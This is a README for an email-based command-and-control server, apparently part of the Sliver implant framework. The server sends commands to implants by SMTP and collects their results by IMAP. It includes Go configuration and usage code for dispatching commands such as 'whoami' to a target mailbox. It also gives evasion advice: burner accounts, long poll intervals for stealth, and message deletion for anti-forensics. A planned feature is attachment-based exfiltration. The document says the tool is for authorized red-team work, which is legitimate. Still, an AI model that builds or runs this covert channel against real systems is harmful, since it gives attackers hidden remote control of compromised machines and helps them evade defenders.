# Outlook C2 Server

Server-side handler for the Outlook COM C2 transport. This component manages command dispatch via SMTP and result collection via IMAP.

## Architecture

```
┌─────────────────┐         SMTP          ┌──────────────┐
│  C2 Server      │─────────────────────→ │   Mailbox    │
│  (This Code)    │                        │              │
│                 │         IMAP           │              │
│                 │←─────────────────────  │              │
└─────────────────┘                        └──────────────┘
        ↑                                         ↓
        │                                         │
        │            Command Flow:                │
        │  1. C2 sends command via SMTP           │
        │  2. Implant polls mailbox via COM       │
        │  3. Implant sends result via COM        │
        │  4. C2 receives result via IMAP         │
        └─────────────────────────────────────────┘
```

## Components

### 1. **handler.go** - Main C2 Handler
Coordinates all C2 operations:
- Command dispatch
- Result collection
- Session management
- Polling loop

### 2. **smtp.go** - SMTP Sender
Sends commands to implants via email:
- TLS/STARTTLS support
- Authentication
- Message formatting (RFC 5322)

### 3. **imap.go** - IMAP Receiver
Receives results from implants:
- TLS support
- Email fetching
- Message parsing
- Mark as read/delete

### 4. **session.go** - Session Manager
Tracks implant sessions:
- Pending tasks
- Completed tasks
- Last seen timestamps
- Cleanup of stale sessions

### 5. **config.go** - Configuration
Server configuration and validation.

## Dependencies

```bash
# IMAP library
go get github.com/emersion/go-imap
go get github.com/emersion/go-imap/client

# Outlook transport (for message encoding/decoding)
# Already part of Sliver
```

## Quick Start

### 1. Configuration

Create a configuration (see `configs/examples/outlook-server-config.json`):

```go
config := &outlook.ServerConfig{
    // SMTP (for sending commands)
    SMTPHost:     "smtp.gmail.com",
    SMTPPort:     587,
    SMTPUsername: "c2@example.com",
    SMTPPassword: "app-password",
    SMTPUseTLS:   true,

    // IMAP (for receiving results)
    IMAPHost:     "imap.gmail.com",
    IMAPPort:     993,
    IMAPUsername: "c2@example.com",
    IMAPPassword: "app-password",
    IMAPUseTLS:   true,
    IMAPFolder:   "INBOX",

    // C2 settings
    C2Email:       "c2@example.com",
    EncryptionKey: encryptionKey, // 32 bytes, must match implants
    PollInterval:  30 * time.Second,
    MarkAsRead:    true,
    DeleteAfter:   false,
    Debug:         true,
}
```

### 2. Start the Handler

```go
handler, err := outlook.NewOutlookC2Handler(config)
if err != nil {
    log.Fatal(err)
}

ctx := context.Background()
if err := handler.Start(ctx); err != nil {
    log.Fatal(err)
}
defer handler.Stop()
```

### 3. Send Commands

```go
sessionID := "session-uuid"
implantEmail := "target@company.com"
command := "whoami"

taskID, err := handler.SendCommand(sessionID, implantEmail, command)
if err != nil {
    log.Fatal(err)
}

// Wait for result (with timeout)
result, err := handler.WaitForTaskResult(sessionID, taskID, 5*time.Minute)
if err != nil {
    log.Fatal(err)
}

fmt.Printf("Result: %s\n", result.Result)
```

### 4. List Sessions

```go
sessions := handler.ListSessions()
for _, session := range sessions {
    fmt.Printf("Session: %s, Email: %s, Last Seen: %s\n",
        session.SessionID,
        session.ImplantEmail,
        session.LastSeen)
}
```

## Email Provider Setup

### Gmail

1. Enable 2FA on your Google account
2. Generate App Password: https://myaccount.google.com/apppasswords
3. Use App Password in config (not your regular password)

```json
{
  "smtp_host": "smtp.gmail.com",
  "smtp_port": 587,
  "imap_host": "imap.gmail.com",
  "imap_port": 993
}
```

### Office 365

```json
{
  "smtp_host": "smtp.office365.com",
  "smtp_port": 587,
  "imap_host": "outlook.office365.com",
  "imap_port": 993
}
```

### Yahoo Mail

```json
{
  "smtp_host": "smtp.mail.yahoo.com",
  "smtp_port": 587,
  "imap_host": "imap.mail.yahoo.com",
  "imap_port": 993
}
```

### Custom SMTP/IMAP

Any provider with SMTP and IMAP support works.

## API Reference

### NewOutlookC2Handler

```go
func NewOutlookC2Handler(config *ServerConfig) (*OutlookC2Handler, error)
```

Creates a new C2 handler.

### Start

```go
func (h *OutlookC2Handler) Start(ctx context.Context) error
```

Starts the handler. Connects to IMAP and begins polling for results.

### Stop

```go
func (h *OutlookC2Handler) Stop() error
```

Stops the handler and disconnects from IMAP.

### SendCommand

```go
func (h *OutlookC2Handler) SendCommand(sessionID, implantEmail, command string) (string, error)
```

Sends a command to an implant. Returns the task ID.

**Parameters:**
- `sessionID`: Unique session identifier (must match implant config)
- `implantEmail`: Email address where implant checks for commands
- `command`: Command to execute (e.g., "whoami", "ipconfig")

**Returns:** Task ID for tracking the result

### WaitForTaskResult

```go
func (h *OutlookC2Handler) WaitForTaskResult(sessionID, taskID string, timeout time.Duration) (*TaskResult, error)
```

Blocks until task result is received or timeout expires.

### GetTaskResult

```go
func (h *OutlookC2Handler) GetTaskResult(sessionID, taskID string) *TaskResult
```

Non-blocking check for task result. Returns nil if not yet received.

### ListSessions

```go
func (h *OutlookC2Handler) ListSessions() []*ImplantSession
```

Returns all active sessions.

### GetSession

```go
func (h *OutlookC2Handler) GetSession(sessionID string) *ImplantSession
```

Returns a specific session by ID.

## Session Management

### ImplantSession

```go
type ImplantSession struct {
    SessionID      string
    ImplantEmail   string
    LastSeen       time.Time
    PendingTasks   map[string]*Task
    CompletedTasks map[string]*TaskResult
}
```

### Task

```go
type Task struct {
    TaskID    string
    Command   string
    CreatedAt time.Time
    SentAt    *time.Time
    Status    string // "pending", "sent", "completed", "failed"
}
```

### TaskResult

```go
type TaskResult struct {
    TaskID     string
    Result     string
    ReceivedAt time.Time
    Error      string
    Success    bool
}
```

## Security Considerations

### Encryption

- All messages encrypted with AES-256-GCM
- Encryption key must match between server and implants
- Each message has unique nonce

### Email Security

⚠️ **Important:**
- Email provider may log all traffic
- Use dedicated account for C2
- Consider email retention policies
- Email gateways may scan content (though it's encrypted)

### Operational Security

1. **Dedicated Email Account:** Use a separate account for C2, not personal
2. **App Passwords:** Never use main account password
3. **Delete After:** Enable `delete_after` for anti-forensics
4. **Poll Interval:** Longer intervals = better stealth
5. **Email Alias:** Consider using email aliases or burner accounts

### Rate Limiting

Email providers have rate limits:
- **Gmail:** ~100 emails/day for free accounts
- **Office 365:** Varies by plan
- **Yahoo:** ~500 emails/day

Monitor and respect these limits.

## Troubleshooting

### SMTP Errors

**"Authentication failed"**
- Check username/password
- For Gmail: Use App Password, not account password
- Ensure 2FA is enabled (Gmail requirement)

**"Connection refused"**
- Check SMTP host/port
- Verify firewall rules
- Try with/without TLS

### IMAP Errors

**"Login failed"**
- Same as SMTP authentication
- Check IMAP is enabled on account

**"Folder not found"**
- Verify folder name (case-sensitive)
- Use "INBOX" not "Inbox"

**"No messages"**
- Check implant is sending to correct email
- Verify encryption keys match
- Check spam folder

### Task Timeouts

If `WaitForTaskResult` times out:
- Implant may be offline
- Email delivery delayed
- Implant polling interval too long
- Check session is active: `session.IsActive()`

## Performance

### Latency

Command-to-result latency depends on:
- Implant poll interval
- Server poll interval
- Email delivery time

**Typical latency:** 30-120 seconds

### Throughput

Limited by:
- Email provider rate limits
- SMTP/IMAP connection overhead
- Polling intervals

**Recommended:** <100 emails/hour

### Resource Usage

- **Memory:** ~20-50MB (depending on session count)
- **CPU:** <1% (mostly idle, polling)
- **Network:** Only SMTP/IMAP traffic

## Example Integration

See `example/main.go` for a complete working example.

## Testing

```bash
# Run with example config
cd server/c2/outlook/example
go run main.go

# The example will:
# 1. Start the C2 server
# 2. Wait for connections
# 3. Send a test command after 10 seconds
# 4. Display results
```

## Best Practices

1. **Use TLS:** Always enable TLS for SMTP and IMAP
2. **Rotate Keys:** Periodically rotate encryption keys
3. **Monitor Sessions:** Track last seen times
4. **Cleanup:** Let stale sessions auto-cleanup
5. **Logging:** Enable debug mode during testing, disable in production
6. **Error Handling:** Check all errors, especially IMAP connection issues

## Future Enhancements

- [ ] Support for OAuth2 authentication
- [ ] Multi-account support (multiple C2 emails)
- [ ] Attachment-based exfiltration
- [ ] Email templates/customization
- [ ] Metrics and monitoring
- [ ] Web UI for session management

## License

Part of Sliver Implant Framework - GNU GPL v3.0

## Author

Developed for authorized penetration testing and red team operations.

⚠️ **WARNING:** This tool is for authorized security testing only. Unauthorized use is illegal.
